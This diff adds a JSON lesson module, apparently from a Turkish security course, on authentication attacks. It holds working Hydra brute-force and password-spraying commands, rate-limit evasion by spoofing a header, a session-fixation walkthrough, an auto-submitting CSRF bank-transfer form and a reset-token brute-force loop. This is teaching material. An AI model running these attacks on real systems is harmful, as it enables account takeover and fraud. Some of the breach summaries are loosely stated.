@@ -1,0 +1,99 @@
+{
+  "id": "auth-failures",
+  "slug": "auth-failures",
+  "title": "A07 — Identification & Authentication Failures",
+  "subtitle": "Kimlik Doğrulama ve Oturum Yönetimi Hataları",
+  "description": "Brute force, credential stuffing, zayıf parola politikası, güvensiz oturum yönetimi, MFA bypass.",
+  "icon": "🗝️",
+  "order": 7,
+  "tags": ["brute force", "credential stuffing", "session fixation", "MFA bypass", "JWT", "parola politikası"],
+  "modules": [
+    {
+      "id": "auth-intro",
+      "title": "Kimlik Doğrulama Zafiyetleri",
+      "description": "Neden auth zafiyetleri bu kadar yaygın ve ne tür saldırılara yol açar",
+      "difficulty": "beginner",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Auth Zafiyetleri Kategorileri",
+          "content": "**Kimlik Doğrulama Zafiyetleri:**\n\n| Zafiyet | Saldırı |\n|---------|--------|\n| Brute force koruması yok | Hydra, hashcat ile sınırsız deneme |\n| Credential stuffing | Sızdırılmış şifreler ile giriş |\n| Zayıf parola politikası | 12345, password |\n| Güvensiz parola sıfırlama | Tahmin edilebilir token, süresi dolmuyor |\n| Session fixation | Giriş öncesi session ID devam ediyor |\n| Session ID URL'de | Log/referer ile sızıyor |\n| MFA bypass | SMS OTP intercept, backup code |\n| Logout session invalidate etmiyor | Eski token hâlâ geçerli |\n\n**Gerçek Örnekler:**\n- **2019 Capital One:** AWS credential ile 106 milyon müşteri verisi\n- **2021 Colonial Pipeline:** VPN şifresi brute force → fidye yazılımı\n- Her yıl 80+ milyar credential stuffing saldırısı"
+        }
+      ]
+    },
+    {
+      "id": "brute-force",
+      "title": "Brute Force & Credential Stuffing",
+      "description": "Hydra, Medusa, Burp Intruder ile login brute force",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Brute Force Araçları",
+          "commands": [
+            {
+              "command": "# Hydra ile HTTP form brute force:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  hedef.com http-post-form \\\n  '/login:username=^USER^&password=^PASS^:Invalid credentials' \\\n  -t 10 -f\n\n# SSH brute force:\nhydra -L users.txt -P passwords.txt ssh://hedef.com -t 4\n\n# FTP brute force:\nhydra -l admin -P rockyou.txt ftp://hedef.com\n\n# RDP brute force:\nhydra -l Administrator -P rockyou.txt rdp://hedef.com",
+              "description": "Hydra ile HTTP form, SSH, FTP, RDP brute force"
+            },
+            {
+              "command": "# Credential stuffing — sızdırılmış şifreler ile giriş:\n# Have I Been Pwned'den liste bul: https://haveibeenpwned.com\n\n# spray.sh ile password spraying (tüm user aynı şifre):\n# Genelde kilitlenmeyi tetiklemez çünkü az deneme yapılır:\nfor user in $(cat users.txt); do\n  result=$(curl -s -X POST https://hedef.com/login \\\n    -d \"username=$user&password=Summer2024!\" \\\n    | grep -c 'Welcome')\n  [ \"$result\" -gt 0 ] && echo \"[HIT] $user:Summer2024!\"\n  sleep 2  # rate limit'ten kaçın\ndone",
+              "description": "Credential stuffing ve password spraying",
+              "tip": "Password spraying: az deneme, çok kullanıcı → kilitlenme tetiklenmez. Corporate ağlarda çok etkili"
+            },
+            {
+              "command": "# Burp Suite Intruder ile brute force:\n# 1. Login isteğini Intruder'a gönder\n# 2. §password§ alanını işaretle\n# 3. Payload: Simple List → rockyou.txt\n# 4. Grep: 'Welcome' veya 302 redirect\n# Farklı response length → başarılı giriş\n\n# Rate limit bypass:\n# X-Forwarded-For header ile IP değiştir:\ncurl -X POST https://hedef.com/login \\\n  -H 'X-Forwarded-For: 10.0.0.1' \\\n  -d 'user=admin&pass=test'",
+              "description": "Burp Intruder ile brute force ve X-Forwarded-For ile IP bypass"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "session-attacks",
+      "title": "Session Yönetimi Saldırıları",
+      "description": "Session fixation, session hijacking, CSRF",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Session Saldırıları",
+          "commands": [
+            {
+              "command": "# Session fixation saldırısı:\n# 1. Saldırgan giriş yapmadan session ID al:\ncurl -c cookies.txt https://hedef.com/login\nSESSION_ID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')\n\n# 2. Kurbanı bu session ID ile giriş yaptır (phishing):\necho \"Linke tıkla: https://hedef.com/login?session=$SESSION_ID\"\n\n# 3. Kurban giriş yaptıktan sonra session ID değişmediyse:\n# Saldırgan aynı ID ile kurbanın hesabını kullanabilir!\ncurl -b \"PHPSESSID=$SESSION_ID\" https://hedef.com/profile",
+              "description": "Session fixation saldırısı — giriş öncesi session ID sabitleme"
+            },
+            {
+              "command": "# CSRF (Cross-Site Request Forgery) — zararlı form:\n# Kurban bu sayfayı ziyaret edince otomatik istek gönderilir:\n<html>\n<body onload=\"document.forms[0].submit()\">\n  <form action=\"https://banka.com/transfer\" method=\"POST\">\n    <input name=\"amount\" value=\"5000\">\n    <input name=\"to\" value=\"SALDIRGAN_IBAN\">\n  </form>\n</body>\n</html>\n\n# Kurban giriş yapmışsa → transfer gerçekleşir!\n# Korunma: CSRF token — her formda benzersiz, tahmin edilemez token",
+              "description": "CSRF saldırısı — kurbanın oturumunu kullanarak işlem yaptır"
+            },
+            {
+              "command": "# Güvensiz parola sıfırlama testi:\n# 1. Token uzunluğu/entropy yeterli mi?\n# Kısa token bruteforce:\nfor token in $(seq 100000 999999); do\n  resp=$(curl -s \"https://hedef.com/reset?token=$token\")\n  if echo \"$resp\" | grep -q 'Enter new password'; then\n    echo \"[FOUND] Token: $token\"\n    break\n  fi\ndone\n\n# 2. Süresi dolmuyor mu?\n# Eski token'ı 24 saat sonra deneme\ncurl 'https://hedef.com/reset?token=abc123&new_pass=hacked123'",
+              "description": "Parola sıfırlama token güvenliği testi"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "mfa-bypass",
+      "title": "MFA Bypass Teknikleri",
+      "description": "OTP bypass, backup code abuse, SIM swap",
+      "difficulty": "advanced",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "MFA Bypass Yöntemleri",
+          "content": "**MFA olmasına rağmen bypass mümkün olabilir:**\n\n1. **OTP Brute Force:** 6 haneli SMS kodu sadece 1.000.000 kombinasyon — rate limit yoksa kırılabilir\n\n2. **Response Manipulation:** MFA doğrulama yanıtı `{\"success\": false}` → `{\"success\": true}` olarak değiştir\n\n3. **OTP Reuse:** Kullanılan OTP hâlâ geçerli mi? (invalidation yapılmamışsa)\n\n4. **Backup Code Brute Force:** 8 haneli backup kod — sınırsız deneme?\n\n5. **SIM Swap:** Operatörü kandırarak numarayı yeni SIM'e taşıt → SMS OTP ele geçir\n\n6. **SS7 Attack:** Telekom altyapısındaki SS7 protokol zafiyeti → SMS dinleme\n\n7. **Phishing + Proxy:** Evilginx2 ile gerçek zamanlı MFA bypass — kullanıcı phishing sayfasında giriş yapar, token proxy'den geçer"
+        }
+      ]
+    }
+  ]
+}
